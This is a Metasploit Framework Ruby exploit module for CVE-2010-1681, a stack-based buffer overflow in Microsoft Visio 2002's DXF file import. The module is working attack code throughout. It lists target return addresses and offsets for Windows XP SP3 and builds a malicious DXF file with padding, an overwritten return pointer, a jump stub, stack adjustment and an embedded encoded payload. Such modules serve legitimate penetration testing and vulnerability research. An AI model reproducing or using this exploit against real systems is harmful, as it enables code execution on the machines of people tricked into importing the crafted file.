# $Id: visio_dxf_bof.rb 13030 2011-06-26 05:59:37Z sinn3r $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GoodRanking
 
    include Msf::Exploit::FILEFORMAT
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Microsoft Office Visio VISIODWG.DLL Crafted DXF File Handling Overflow&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a stack based overflow vulnerability in the handling
                of the DXF files by Microsoft Visio 2002. Revisions prior to the release of
                the MS bulletin MS10-028 are vulnerable. The overflow occurs when the application
                is used to import a specially crafted DXF file, while parsing the HEADER section
                of the DXF file.
 
                To trigger the vulnerability an attacker must convince someone to insert a
                specially crafted DXF file to a new document, go to &#039;Insert&#039; -> &#039;CAD Drawing&#039;
                },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;CORE Security&#039;,  # original discovery
                    &#039;Shahin Ramezany <shahin[at]abysssec.com>&#039;, # MOAUB #8 exploit and binary analysis
                    &#039;juan vazquez&#039;, # metasploit module
                ],
            &#039;Version&#039;        => &#039;$Revision: 13030 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;,&#039;2010-1681&#039; ],
                    [ &#039;OSVDB&#039;, &#039;64446&#039; ],
                    [ &#039;BID&#039;, &#039;39836&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.coresecurity.com/content/ms-visio-dxf-buffer-overflow&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/moaub-8-microsoft-office-visio-dxf-file-stack-overflow/&#039; ],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                    &#039;DisablePayloadHandler&#039; => &#039;true&#039;,
                },
            &#039;Payload&#039; =>
                {
                    &#039;Space&#039;         => 2000,
                    &#039;BadChars&#039;      => Rex::Text.charset_exclude(Rex::Text::AlphaNumeric),
                    &#039;DisableNops&#039;   => true, # no need
                    &#039;EncoderOptions&#039; =>
                        {
                            &#039;BufferRegister&#039; => &#039;ECX&#039;
                        }
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    # Microsoft Office Visio 2002
                    # VISIO.EXE v10.0.525.4
                    # VISIODWG.DLL v10.0.525.4
                    # ECXAdjust:
                    # 0x1A => Padding
                    # 0x2 => len(push esp, pop ecx)
                    # 0x3 => len(sub)
                    # 0x6 => len(add)
                    [
                        &#039;Visio 2002 English on Windows XP SP3 Spanish&#039;,
                        {
                            &#039;Ret&#039;         => 0x6173345c, # push esp, ret from VISIODWG.DLL
                            &#039;Offset&#039;      => 0x50,       # EIP
                            &#039;ReadAddress&#039; => 0x617a4748, # points to VISIODWG.DLL data segment
                            &#039;ECXAdjust&#039;   => 0x2D
                        }
                    ],
                    [
                        &#039;Visio 2002 English on Windows XP SP3 English&#039;,
                        {
                            &#039;Ret&#039;         => 0x60455F6B, # push esp, ret from VISLIB.DLL
                            &#039;Offset&#039;      => 0x50,       # EIP
                            &#039;ReadAddress&#039; => 0x66852040, # points to VISIODWG.DLL data segment
                            &#039;ECXAdjust&#039;   => 0x2D,
                        }
                    ],
                ],
            &#039;DisclosureDate&#039; => &#039;May 04 2010&#039;))
 
        register_options(
            [
                OptString.new(&#039;FILENAME&#039;,   [ true, &#039;The file name.&#039;,  &#039;msf.dxf&#039;]),
            ], self.class)
    end
 
    def exploit
        content = "0\n"
        content << "SECTION\n"
        content << "2\n"
        content << "HEADER\n"
        content << "9\n"
        content << "$ACADMAINTVER"
        content << "\x41"*(target[&#039;Offset&#039;] - "ACADMAINTVER".length)
        content << [target.ret].pack(&#039;V&#039;) # new ret
        content << "\xeb\x20\x90\x90" # short jmp to payload (plus two padding nops)
        content << [target[&#039;ReadAddress&#039;]].pack(&#039;V&#039;) # readable address to avoid exceptions
        content << "\x42"*0x1A # jumped by the short jump
        # Get in ECX a pointer to the shellcode start
        content << "\x54" # push esp
        content << "\x59" # pop ecx
        # ecx adjustment
        content << Rex::Arch::X86.sub(-(target[&#039;ECXAdjust&#039;]),Rex::Arch::X86::ECX, "\x00\x0d\x0a", false, true)
        # Stack adjustment
        content << "\x81\xc4\x48\xf4\xff\xff" # add esp, -3000
        content << payload.encoded
        content << "\n"
        content << "0\n"
        content << "ENDSEC\n"
        content << "0\n"
        content << "EOF\n"
 
        print_status("Creating #{datastore[&#039;FILENAME&#039;]} ...")
        file_create(content)
    end
 
end



